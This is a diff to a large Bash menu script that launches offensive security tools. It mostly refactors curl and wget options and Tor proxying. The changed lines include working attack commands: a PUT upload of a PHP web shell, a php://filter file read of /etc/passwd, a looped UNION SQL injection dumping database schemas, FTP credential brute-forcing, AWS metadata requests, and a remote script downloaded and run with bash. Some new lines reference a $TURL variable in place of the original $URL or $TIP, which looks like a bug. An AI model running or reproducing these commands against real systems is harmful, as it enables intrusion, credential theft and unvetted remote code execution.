@@ -16,12 +16,8 @@ RLS="/releases"
 RLDW="$RLS""/download"
 WBE="For a better experience, please install "
 FMSG="press ENTER to continue..."
-CURLANON=""
-DEFANON=""
+SANON=""
 ANON="Disabled"
-SHEADER=""
-HEADERS=("")
-SHEADER=""
 USERAGENT=""
 COOKIE=""
 SECL="$ENTRAW""danielmiessler/SecLists/master/"
@@ -34,9 +30,9 @@ function Controlla
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl $CCOOKIE $SHEADER $USERAGENT -s -k -L -I $CURLANON "$1"
+		curl -s -k -L -I --socks5 "$SANON" "$1"
 	else
-		wget $SHEADER $USERAGENT --no-check-certificate --spider "$1"
+		wget --no-check-certificate --spider "$1"
 	fi
 }
 
@@ -44,17 +40,17 @@ function ScaricaIn
 {
 	if [[ -d "$ALD" ]];
 	then
-		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ALD""$2"
+		wget --no-check-certificate "$1" -O "$ALD""$2"
 	elif [[ -d "$AZD" ]];
 	then
-		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$AZD""$2"
+		wget --no-check-certificate "$1" -O "$AZD""$2"
 	else
 		ls /storage
 		echo "Digit where download, remember the slash at the end of the path"
 		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
 		if [[ -d "$ATD" ]];
 		then
-			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ATD""$2"
+			wget --no-check-certificate "$1" -O "$ATD""$2"
 		fi
 	fi
 	echo "Downloaded ""$2"
@@ -148,7 +144,7 @@ function Clona
 	DKF="Dockerfile"
 	echo "Choose what version you want to download ""$1"
 	echo "0. back"
-	if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 	then
 		echo "1. Dockerfile"
 	fi
@@ -159,7 +155,7 @@ function Clona
 		echo "2. Release"
 	fi
 	echo "3. Clone"
-	if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 	then
 		echo "4. read the README.md file"
 	fi
@@ -172,11 +168,11 @@ function Clona
 		then
 			docker build -t $(echo -n "$1" | awk -F "/" '{print $2}') "$ENTSSL""$1"".git"
 		else
-			if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
+			if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
 			then
 				Scarica "$ENTRAW""$1""/master/""$DKF" "$DKF"
 			else
-				if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+				if [[ $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 				then
 					Scarica "$ENTRAW""$1""/main/""$DKF" "$DKF"
 				else
@@ -214,12 +210,12 @@ function Clona
 		else
 			LESS="less"
 		fi
-		if [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
+		if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
-		elif [[ $(wget $WCOOKIE $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+			curl -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
+		elif [[ $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
+			curl -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
 		else
 			echo "There is not any README.md file"
 		fi
@@ -233,9 +229,9 @@ function ScaricaWL
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1"
+		curl -s -k -L --socks5 "$SANON" "$1"
 	else
-		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O -
+		wget --no-check-certificate "$1" -O -
 	fi
 }
 
@@ -245,19 +241,19 @@ function Scarica
 	then
 		if [[ "$2" != "" ]];
 		then
-			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$2"
+			curl -s -k -L --socks5 "$SANON" "$1" -o "$2"
 		else
 			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
-			curl $CCOOKIE $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$QUESTO"
+			curl -s -k -L --socks5 "$SANON" "$1" -o "$QUESTO"
 			chmod +x "$QUESTO"
 		fi
 	else
 		if [[ "$2" != "" ]];
 		then
-			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1" -O "$2"
+			wget --no-check-certificate "$1" -O "$2"
 			chmod +x "./""$2"
 		else
-			wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$1"
+			wget --no-check-certificate "$1"
 			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
 		fi
 	fi
@@ -2078,8 +2074,7 @@ while true; do
 		Stampa " 2648. XOR bitwise a string value" "2649. XOR bitwise an array of chars converted in INT values"
 		Stampa " 2650. AND bitwise an array of chars converted in INT values"
 		Stampa " 2651. OR bitwise an array of chars converted in INT values"
-		Stampa " 2652. AND bitwise string value" "2653. OR bitwise string value" "2654. set User-Agent"
-		Stampa " 2655. set HTTP request headers" "2657. print HEADER values" "2656. Set Cookies "
+		Stampa " 2652. AND bitwise string value" "2653. OR bitwise string value"
 		echo "$SEP"
 	fi
 	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
@@ -2270,7 +2265,7 @@ while true; do
 	read -p "Choose a script: " SCELTA
 	case "$SCELTA" in
 	"0")
-		CURLANON=""
+		SANON=""
 		ANON=""
 		QUESTO=""
 		PYPAK=""
@@ -2706,7 +2701,7 @@ while true; do
 	;;
 	"44")
 		Clona "lc/gau"
-		wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
+		wget --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
 	;;
 	"45")
 		Clona "porterhau5/BloodHound-Owned"
@@ -3421,7 +3416,12 @@ while true; do
 				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
 				if [[ "$IMAPREQ" != "" ]];
 				then
-					curl $CCOOKIE $SHEADER $USERAGENT $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					if [[ "$ANON" == "Enabled" ]];
+					then
+						curl -s -k -L --socks5 "$SANON" --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					else
+						curl -s -k -L --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					fi
 				fi
 			fi
 		fi
@@ -4929,7 +4929,12 @@ while true; do
 			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
 			if [[ "$PAGE" != "" ]];
 			then
-				curl $CCOOKIE $SHEADER $USERAGENT $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				if [[ "$ANON" == "Enabled" ]];
+				then
+					curl -s -k -L --socks5 "$SANON" "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				else
+					curl -s -k -L "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				fi
 			fi
 		fi
 	;;
@@ -5065,7 +5070,7 @@ while true; do
 		read -p "(example, http://site.web or http://192.168.0.12): " URL
 		if [[ "$URL" != "" ]];
 		then
-			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget $WCOOKIE $SHEADER $USERAGENT "$URL""/""$FILE"; done
+			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget "$URL""/""$FILE"; done
 		fi
 	;;
 	"599")
@@ -5080,7 +5085,12 @@ while true; do
 			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
-				curl $CCOOKIE $SHEADER $USERAGENT $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
+				if [[ "$ANON" == "Enabled" ]];
+				then
+					curl -s -k -L --socks5 "$SANON" -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+				else
+					curl -s -k -L -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+				fi
 			fi
 		fi
 	;;
@@ -5128,7 +5138,7 @@ while true; do
 		Scarica "$ENTRAW""dariusztytko/jwt-key-id-injector/master/injector.py"
 	;;
 	"615")
-		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget $WCOOKIE $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
+		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
 	;;
 	"616")
 		Clona "rajkumardusad/Tool-X"
@@ -5349,7 +5359,12 @@ while true; do
 					TDP="$TTDP"
 				fi
 			fi
-			curl $CCOOKIE $SHEADER $USERAGENT $CURLANON -s "$TIP"":""$TDP""/version" | python -m json.tool
+			if [[ "$ANON" == "Enabled" ]];
+			then
+				curl -s -k -L --socks5 "$SANON" "$TIP"":""$TDP""/version" | python -m json.tool
+			else
+				curl -s -k -L "$TIP"":""$TDP""/version" | python -m json.tool
+			fi
 		fi
 	;;
 	"653")
@@ -5698,7 +5713,7 @@ while true; do
 		read -p "(example, 10.11.12.13): " IP
 		if [[ "$IP" != "" ]];
 		then
-			wget $WCOOKIE $SHEADER $USERAGENT -m --no-passive ftp://anonymous:anonymous@$IP
+			wget -m --no-passive ftp://anonymous:anonymous@$IP
 		fi
 	;;
 	"750")
@@ -5718,7 +5733,7 @@ while true; do
 					do
 						for USRN in $(cat "$UWRD");
 						do
-							wget $WCOOKIE $SHEADER $USERAGENT -m --no-passive "ftp://$USRN:$PSSW@$IP"
+							wget -m --no-passive "ftp://$USRN:$PSSW@$IP"
 						done
 					done
 				fi
@@ -11007,7 +11022,12 @@ while true; do
 		if [[ "$TIP" != "" ]];
 		then
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TIP/latest/api/token"`
-			curl $CCOOKIE $SHEADER $USERAGENT $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TIP/latest/meta-data"
+			if [[ "$ANON" == "Enabled" ]];
+			then
+				curl -s -k -L --socks5 "$SANON" -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+			else
+				curl -s -k -L -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+			fi
 		fi
 	;;
 	"2424")
@@ -11713,8 +11733,7 @@ while true; do
 			then
 				sv start tor
 			fi
-			CURLANON="--socks5 127.0.0.1:9050"
-			DEFANON="127.0.0.1:9050"
+			SANON="127.0.0.1:9050"
 		else
 			echo "Disabling Anonymization"
 			ANON="Disabled"
@@ -11725,8 +11744,7 @@ while true; do
 			then
 				sv stop tor
 			fi
-			CURLANON=""
-			DEFANON=""
+			SANON=""
 		fi
 	;;
 	"2565")
@@ -12182,7 +12200,7 @@ while true; do
 				MFRO=""
 
 				echo "$PAR"" ""$UNION"" ""$SELECT"" version() -- -"
-				curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TIP"
+				curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TIP"
 				for I in {1..9}
 				do
 					if [[ "$Q" == "" ]];
@@ -12192,7 +12210,7 @@ while true; do
 						Q="$Q""$I"","
 					fi
 					echo "$PAR"" ""$UNION"" ""$SELECT"" ""$Q""version() -- -"
-					curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TIP"
+					curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TIP"
 				done
 				echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 				echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -12227,9 +12245,9 @@ while true; do
 							for B in $(seq 0 $FST)
 							do
 								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								##curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##curl -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					else
@@ -12238,9 +12256,9 @@ while true; do
 							for B in $(seq 0 $FST)
 							do
 								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
-								##curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					fi
@@ -12260,7 +12278,7 @@ while true; do
 								then
 									if [[ "$CLMN" != "quit" ]];
 									then
-										curl $CCOOKIE $SHEADER $USERAGENT -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TIP"
+										curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TIP"
 									fi
 								fi
 							fi
@@ -12704,22 +12722,25 @@ while true; do
 		fi
 	;;
 	"2654")
-		echo "Digit a valid User-Agent or select from list, exit to quit the selection"
+		echo "Digit a valid User-Agent or select from list, 'exit' to quit the selection, 'reset' to clear USER-AGENT"
 		select CHOICE in "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPad; CPU OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/97.0" "Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:97.0) Gecko/97.0 Firefox/97.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/83.0.4103.116 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 EdgA/97.0.1072.69" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/97.1072.69 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 Edge/40.15254.603" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edge/44.18363.8131" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod touch; CPU iPhone 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "custom" "exit"
 		do
 			if [[ "$CHOICE" != "exit" ]];
 			then
 				if [[ "$CHOICE" == "custom" ]];
 				then
-					read -p "Digit a custom User-Agent: " USERAGENT
-					if [[ "$USERAGENT" != "" ]];
+					read -p "Digit a custom User-Agent: " SUSERAGENT
+					if [[ "$SUSERAGENT" != "" ]];
 					then
 						USERAGENT=""
-						USERAGENT="--user-agent \"""$USERAGENT""\""
+						USERAGENT="$SUSERAGENT"
 					fi
+				elif [[ "$CHOICE" == "reset" ]];
+				then
+					USERAGENT=""
 				else
 					USERAGENT=""
-					USERAGENT="--user-agent \"""$CHOICE""\""
+					USERAGENT="$CHOICE"
 				fi
 			fi
 			break
